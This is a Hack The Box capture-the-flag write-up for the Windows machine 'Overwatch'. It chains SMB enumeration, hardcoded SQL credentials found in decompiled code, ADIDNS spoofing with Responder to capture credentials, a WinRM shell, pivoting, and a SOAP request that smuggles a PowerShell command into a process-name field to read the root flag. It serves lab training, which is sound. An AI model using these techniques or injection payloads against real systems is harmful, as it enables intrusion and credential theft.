# Overwatch - Hack The Box Writeup
**Category:** Windows  
**Difficulty:** Medium 

## Enumeration

### Nmap

Initial scan identified the target as a Windows Active Directory environment.

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022
9389/tcp  open  mc-nmf
```

Domain:

```text
overwatch.htb
```

---

# SMB Enumeration

Using SMBMap:

```bash
smbmap -H 10.129.244.81
```

I discovered read access to:

```text
IPC$
software$
```

The `software$` share contained several interesting files.

---

# Analyzing the Application

Inside the share I found:

```text
overwatch.exe
overwatch.pdb
```

The PDB file leaked useful debugging information.

---

## Interesting Findings from the PDB

The PDB revealed the existence of a monitoring service:

```text
Monitoring Service
```

implemented using:

```text
Windows Communication Foundation (WCF)
```

running internally on:

```text
TCP 8000
```

The service was filtered externally.

The PDB also revealed the source code path:

```text
C:\Users\Administrator\source\repos\overwatch\overwatch
```

This strongly suggested that the service was developed and likely executed by:

```text
Administrator
```

making it a potentially valuable privilege escalation target.

The debug information also showed that the application stored data in a database.

---

## Binary Analysis

Running strings against the executable revealed:

```text
.NETFramework,Version=v4.7.2
```

This version is still supported but has historically been affected by multiple security issues including remote code execution and information disclosure vulnerabilities.

To obtain a better understanding of the application, I decompiled it using:

```bash
ilspycmd overwatch.exe
```

---

# Source Code Review

The decompiled code revealed hardcoded SQL credentials:

```text
sqlsvc : TI0LKcfHzZw1Vv
```

This immediately provided a foothold into the SQL environment.

---

## SQL Injection Discovery

Reviewing the source code also uncovered a SQL injection vulnerability.

Vulnerable code:

```csharp
SqlCommand val2 = new SqlCommand(
"INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), '" + type + "', '" + detail + "')",
val
);
```

The variables:

```text
type
detail
```

were concatenated directly into the query without sanitization.

This creates a classic SQL injection vulnerability.

---

## Command Injection Discovery

A second vulnerability was found in the `KillProcess()` functionality.

Vulnerable code:

```csharp
string text = "Stop-Process -Name " + processName + " -Force";

val2.get_Commands().AddScript(text);
```

Since `processName` was directly concatenated into a PowerShell command, arbitrary PowerShell commands could potentially be injected.

This looked like a promising privilege escalation vector.

---

# MSSQL Access

Using the recovered credentials:

```text
sqlsvc : TI0LKcfHzZw1Vv
```

I connected to SQL Server.

```bash
impacket-mssqlclient \
sqlsvc:TI0LKcfHzZw1Vv@10.129.244.81 \
-port 6520 \
-windows-auth
```

Access was successful.

---

# Linked Server Enumeration

Enumerating linked servers:

```sql
enum_links
```

revealed:

```text
SQL07
```

Attempting to use it directly:

```sql
use_link SQL07
```

resulted in a connection error.

---

# ADIDNS Abuse

Further enumeration showed that the account possessed:

```text
ADIDNS write permissions
```

This allowed DNS records to be created within the domain.

I created a DNS record that pointed the linked server hostname to my attacking machine:

```bash
python3 dnstool.py \
-u 'overwatch.htb\sqlsvc' \
-p 'TI0LKcfHzZw1Vv' \
-r SQL07.overwatch.htb \
-d 10.10.14.X \
--action add \
10.129.244.81
```

After creating the record, I started Responder.

```bash
sudo responder -I tun0
```

---

# Capturing Credentials

Next, I forced SQL Server to communicate with the linked server.

```sql
SELECT * FROM OPENQUERY("SQL07", 'SELECT @@VERSION');
```

The authentication attempt reached my Responder instance.

Recovered credentials:

```text
sqlmgmt : bIhBbzMMnB82yx
```

---

# Shell Access

Using the newly obtained credentials:

```bash
evil-winrm \
-i 10.129.244.81 \
-u sqlmgmt \
-p 'bIhBbzMMnB82yx'
```

I obtained a WinRM shell.

---

# Accessing the Internal WCF Service

The vulnerable monitoring service was still only accessible internally.

To reach it, I used Ligolo-NG for pivoting.

After establishing the tunnel, I could access:

```text
127.0.0.1:8000
```

from my Kali machine.

---

# Exploiting Command Injection

Using Burp Suite, I captured a legitimate SOAP request to the monitoring service.

The vulnerable endpoint was:

```text
MonitorService
```

Specifically:

```text
KillProcess()
```

Since the application directly concatenated user input into a PowerShell command, command injection was possible.

---

## Malicious SOAP Request

```http
POST /MonitorService HTTP/1.1
Host: 240.0.0.1:8000
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>
        notepad ; type C:\Users\Administrator\Desktop\root.txt ; #
      </processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
```

The resulting PowerShell command became:

```powershell
Stop-Process -Name notepad ; type C:\Users\Administrator\Desktop\root.txt ; # -Force
```

Everything after the semicolon was interpreted as a separate command.

---

# Root Flag

The service executed under the Administrator context.

As a result, the injected command successfully read:

```text
C:\Users\Administrator\Desktop\root.txt
```

The contents of the file were returned in the SOAP response.

Root flag obtained.

---

# Lessons Learned

- PDB files often leak valuable internal information such as source code paths and service architecture.
- Decompiled .NET applications frequently expose credentials and logic flaws.
- Hardcoded credentials remain one of the easiest ways to gain access to enterprise services.
- Linked SQL Servers can be abused for credential theft.
- ADIDNS permissions can be extremely dangerous when combined with name resolution attacks.
- Internal services should never assume that user input is trusted simply because the service is not internet-facing.
- WCF services deserve the same level of scrutiny as traditional web applications.
- Command injection vulnerabilities become especially dangerous when the service runs with elevated privileges.

---

**Personal Opinion:** This machine was a great example of how a small amount of source code disclosure can completely compromise an environment. The chain from SMB access → binary analysis → SQL access → ADIDNS abuse → credential capture → WCF command injection felt very realistic and highlighted how multiple minor weaknesses can combine into a full domain compromise path.
